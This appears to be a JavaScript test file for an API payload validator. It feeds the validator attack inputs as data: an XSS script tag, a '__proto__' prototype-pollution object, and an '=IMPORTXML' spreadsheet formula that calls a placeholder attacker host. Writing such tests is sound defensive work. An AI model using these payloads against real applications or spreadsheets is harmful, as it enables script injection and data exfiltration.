import assert from 'node:assert/strict';
import { validateAndSanitizeApiPayload } from '../worker/src/securityValidation.js';

function expectInvalid(payload, fieldContains) {
  const result = validateAndSanitizeApiPayload(payload);
  assert.equal(result.ok, false, 'payload should be invalid');
  if (fieldContains) {
    const found = (result.errors || []).some((err) => String(err.field || '').includes(fieldContains));
    assert.equal(found, true, `expected error containing field ${fieldContains}`);
  }
}

function expectValid(payload) {
  const result = validateAndSanitizeApiPayload(payload);
  assert.equal(result.ok, true, `payload should be valid: ${JSON.stringify(result.errors || [])}`);
  return result.sanitized;
}

function run() {
  // 1) XSS payload in textual input
  expectInvalid(
    {
      kind: 'entity',
      entity: 'Setor',
      operation: 'create',
      record: { nome: '<script>alert(1)</script>' },
    },
    'record'
  );

  // 2) Prototype pollution key
  expectInvalid(
    {
      kind: 'entity',
      entity: 'Setor',
      operation: 'filter',
      filter: JSON.parse('{"__proto__":{"polluted":true}}'),
    },
    'payload'
  );

  // 3) Formula injection mitigation for spreadsheet writes
  const formulaPayload = expectValid({
    kind: 'entity',
    entity: 'Setor',
    operation: 'create',
    record: { observacao: '=IMPORTXML("http://attacker")' },
  });
  assert.equal(formulaPayload.record.observacao.startsWith("'="), true, 'formula must be prefixed');

  // 4) Unknown fields outside schema
  expectInvalid(
    {
      kind: 'function',
      name: 'autenticar',
      payload: { action: 'login', login: 'admin', password: 'x', tipo: 'escritorio', extra: 'not-allowed' },
    },
    'payload.extra'
  );

  // 5) String above limit
  expectInvalid(
    {
      kind: 'entity',
      entity: 'Setor',
      operation: 'create',
      record: { nome: 'a'.repeat(2100) },
    },
    'record'
  );

  console.log('Security validation scenarios: OK');
}

run();
